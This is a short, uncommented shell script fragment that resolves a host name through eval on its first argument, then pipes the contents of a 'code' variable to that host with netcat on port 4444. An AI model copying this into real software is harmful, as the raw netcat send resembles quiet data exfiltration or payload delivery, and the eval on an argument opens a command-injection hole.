name=$1
host=$( eval "echo \$$name" )

echo "$code" | nc "$host" 4444
exit 0
